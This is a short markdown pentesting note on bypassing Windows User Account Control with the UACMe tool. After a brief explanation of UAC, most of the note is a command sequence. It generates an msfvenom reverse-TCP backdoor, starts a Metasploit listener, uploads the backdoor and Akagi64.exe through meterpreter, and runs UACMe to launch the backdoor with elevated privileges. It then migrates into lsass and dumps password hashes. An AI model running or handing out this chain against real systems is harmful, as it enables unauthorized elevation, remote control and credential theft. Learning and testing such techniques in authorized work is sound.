---
title: PrivEsc - Bypassing UAC with UACMe
date: 2024-03-22
description: 
tags: #privesc #windows #uac
- 
---

# UAC (User Account Control)

UAC is a security feature introduced in Windows Vista. It is used to prevent changes to the operating system without the proper adminitrative approval. A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, where a privileged user will just be prompted with a consent prompt.

It's possible to bypass UAC in order to execute malicious executables with elevated privileges.

# Bypassing UAC

To bypass UAC, we need to have access to a user account that is part of the local adminitrators group.

There are multiple tools and techniques that can be used to bypass UAC, however, the tool and technique will differ depending on the version of Windows running on the target system.

## UACMe

With more than 60 exploits, [UACMe](https://github.com/hfiref0x/UACME) is an open source privesc tool developed by *@hfire0x*. It allows attackers to execute malicious payloads on a Windows target win adminitrative/elevated privileges by abusing the inbuilt Windows AutoElevate tool.

## Bypassing UAC with UACMe

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<myip> LPORT=1444 -f exe > backdoor.exe

# Session 1
meterpreter > pgrep explorer
meterpreter > migrate <id>

# Session 2
msf5 > use multi/handler
msf5 > set payload windows/meterpreter/reverse_tcp
msf5 > set LHOST myip
msf5 > set LPORT 1444
msf5 > run

# Session 1
meterpreter > cd C:\\
meterpreter > mkdir Temp
meterpreter > cd Temp
meterpreter > upload backdoor.exe
meterpreter > upload /opt/UACME/Akagi64.exe
meterpreter > shell

C:\Temp>.\Akagi64.exe 23 C:\Temp\backdoor.exe

# We should receive a reverse shell on our listener on shell 2

# Dump them hashes!
meterpreter > ps -S lsass.exe
meterpreter > migrate <PID>
meterpreter > hashdump
```


## Links:
- [UACMe](https://github.com/hfiref0x/UACME)
- [Microsoft Learn - How User Account Control works](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works)

202403221603
